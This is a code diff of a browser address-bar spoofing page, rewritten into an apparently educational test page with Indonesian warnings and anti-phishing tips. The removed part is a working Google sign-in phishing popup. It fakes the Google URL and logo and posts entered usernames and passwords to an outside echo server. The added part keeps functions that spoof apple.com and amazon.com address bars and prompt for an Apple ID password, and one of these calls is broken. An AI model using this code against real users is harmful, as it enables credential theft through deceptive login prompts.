@@ -1,37 +1,207 @@
-Sign in via Google by clicking <a href="" id="qbutt">here</a>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Browser Spoofing Test - Educational Purpose</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background-color: white;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .warning {
+            background-color: #fff3cd;
+            border: 1px solid #ffeeba;
+            color: #856404;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+        .test-area {
+            border: 2px dashed #007bff;
+            padding: 20px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🛡️ Browser Spoofing Security Test</h1>
+        
+        <div class="warning">
+            <strong>⚠️ PERINGATAN:</strong> Script ini untuk tujuan edukasi keamanan dan pengujian saja.
+            Jangan gunakan untuk aktivitas berbahaya atau menipu orang lain.
+        </div>
 
+        <div class="test-area">
+            <h2>Test Spoofing Techniques</h2>
+            
+            <!-- Original Spoof Function -->
+            <h3>Test 1: Basic Spoof</h3>
+            <button onclick="spoof()">Test Basic Spoof</button>
+            
+            <!-- Enhanced Test Functions -->
+            <h3>Test 2: Window Spoof</h3>
+            <button onclick="testWindowSpoof()">Test Window Spoof</button>
+            
+            <h3>Test 3: URL Bar Manipulation</h3>
+            <button onclick="testURLBarSpoof()">Test URL Bar Spoof</button>
+            
+            <h3>Test 4: Phishing Simulation</h3>
+            <button onclick="testPhishingSimulation()">Test Phishing Sim</button>
+            
+            <h3>Reset/Cleanup</h3>
+            <button onclick="cleanup()" style="background-color: #dc3545;">Reset Windows</button>
+        </div>
 
+        <div id="result" style="margin-top: 20px; padding: 10px; border: 1px solid #ddd; display: none;"></div>
+        
+        <h3>📋 Educational Notes:</h3>
+        <ul>
+            <li><strong>Same-Origin Policy:</strong> Browser membatasi akses antar domain berbeda</li>
+            <li><strong>Address Bar:</strong> URL asli selalu terlihat di browser modern</li>
+            <li><strong>HTTPS:</strong> Koneksi aman ditandai dengan icon gembok</li>
+            <li><strong>Pop-up Blocker:</strong> Browser modern memblokir pop-up mencurigakan</li>
+        </ul>
+    </div>
 
+    <script>
+    // Original spoof function
+    function spoof() {
+        document.write("<h1>This is not apple.com</h1>");
+        window.location.assign("http://www.apple.com:1234");
+        setInterval(spoof24(), 2000);
+        setTimeout(function() {
+            prompt('Checking your appid password:');
+        }, 6000);
+    }
 
-<script>
-var spoofee="https://accounts.google.com/signin/v2/identifier?hl=en&passive=true&continue=https%3A%2F%2Fwww.google.com%2F%3Fgws_rd%3Dssl&flowName=GlifWebSignIn&flowEntry=ServiceLogin";
-var qbutt=document.getElementById("qbutt");
-qbutt.href=spoofee;
-var qwin;
-qbutt.onclick=function(e){
+    // Fixed version untuk testing
+    function testWindowSpoof() {
+        showResult("Testing window spoof technique...");
+        try {
+            // Simulasi spoof dengan popup
+            let spoofWindow = window.open("about:blank", "_blank", "width=600,height=400");
+            if (spoofWindow) {
+                spoofWindow.document.write(`
+                    <html>
+                        <head><title>Security Test</title></head>
+                        <body style="font-family: Arial;">
+                            <h2 style="color: red;">⚠️ SIMULATED SPOOF</h2>
+                            <p>Ini adalah simulasi address bar spoofing.</p>
+                            <p>URL asli window ini adalah: about:blank</p>
+                            <p style="color: blue;">Browser modern menampilkan origin asli di address bar</p>
+                            <button onclick="window.close()">Close Window</button>
+                        </body>
+                    </html>
+                `);
+                spoofWindow.document.close();
+            } else {
+                alert("Popup diblokir! Enable popup untuk test ini.");
+            }
+        } catch (e) {
+            console.error("Spoof attempt blocked:", e);
+        }
+    }
 
-	qwin=open("","_BLANK","toolbar=no,height=350,width=305");
-	
-	setTimeout(function(){
-		qwin.document.title="\uD83D\uDD12 "+spoofee;
-		qwin.document.body.innerHTML=`<style>*{margin:15px auto;}
-		input{width:300px;height:40px;font-size:20px;}
-		</style>
-		<div style="font-family: 'Google Sans',arial,sans-serif;display:block;width:300px;height:400px;borer:1px solid red;">
-		
-		<svg viewBox="0 0 74 37" width="200" height="110" preserveAspectRatio="xMinYMin" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><g id="qaEJec"><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path></g><g id="YGlOvc"><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g><g id="BWfIk"><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path></g><g id="e6m3fd"><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path></g><g id="vbkDmc"><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path></g><g id="idEJde"><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path></g></svg>
-		<h2>Sign in</h2>
-		<form action="https://postman-echo.com/post" method="post">
-			<input type="text" name="username" placeholder="Email" />
-			<br>
-			<input type="password" name="password" placeholder="Password" />
-			<br>
-			<input type="submit" value="Login" />
-		</form>
-		</div>
-		
-		`;
-		
-	},333)
-return false;}
-</script>
+    // Test URL bar manipulation
+    function testURLBarSpoof() {
+        showResult("Testing URL bar manipulation...");
+        alert("Browser modern mencegah JavaScript memanipulasi address bar untuk domain berbeda.");
+    }
+
+    // Phishing simulation
+    function testPhishingSimulation() {
+        showResult("Menampilkan simulasi phishing untuk edukasi...");
+        
+        let testWindow = window.open("about:blank", "_blank", "width=500,height=400");
+        if (testWindow) {
+            testWindow.document.write(`
+                <html>
+                    <head>
+                        <title>Phishing Simulation - EDUCATIONAL</title>
+                        <style>
+                            body { font-family: Arial; padding: 20px; }
+                            .warning { background: #ffdddd; padding: 15px; border-radius: 5px; }
+                        </style>
+                    </head>
+                    <body>
+                        <div class="warning">
+                            <h2>⚠️ PHISHING SIMULATION</h2>
+                            <p><strong>Bagaimana cara mengenali phishing:</strong></p>
+                            <ul>
+                                <li>Cek URL di address bar - selalu pastikan domain benar</li>
+                                <li>Periksa sertifikat SSL (icon gembok)</li>
+                                <li>Jangan pernah memasukkan password di pop-up</li>
+                                <li>Website resmi tidak pernah minta password via pop-up</li>
+                            </ul>
+                            <p style="color: red;">Ini hanya simulasi edukasi - jangan masukkan data asli!</p>
+                            <button onclick="window.close()">Tutup</button>
+                        </div>
+                    </body>
+                </html>
+            `);
+            testWindow.document.close();
+        }
+    }
+
+    // Helper function to show results
+    function showResult(message) {
+        let resultDiv = document.getElementById('result');
+        resultDiv.style.display = 'block';
+        resultDiv.innerHTML = `<p><strong>Test Result:</strong> ${message}</p>`;
+    }
+
+    // Cleanup function
+    function cleanup() {
+        showResult("Membersihkan test windows...");
+        // Note: JavaScript tidak bisa close window yang tidak dibuat oleh script
+        alert("Close test windows manually jika perlu.");
+    }
+
+    // Original race function - dimodifikasi untuk testing
+    let windowSpoof;
+
+    function race() {
+        try {
+            if (windowSpoof && windowSpoof.location) {
+                windowSpoof.location.href !== 'about:blank';
+            }
+        } catch (e) {
+            if (windowSpoof) {
+                windowSpoof.location.href = 'https://www.google.com/csi';
+            }
+        }
+    }
+
+    function startSpoof() {
+        windowSpoof = window.open("https://www.google.com:82", "x");
+        if (windowSpoof) {
+            windowSpoof.document.write("<h2>Your address bar has been spoofed. This is not https://www.amazon.com/</h2>");
+            setInterval(race, 0);
+        }
+    }
+    </script>
+</body>
+</html>
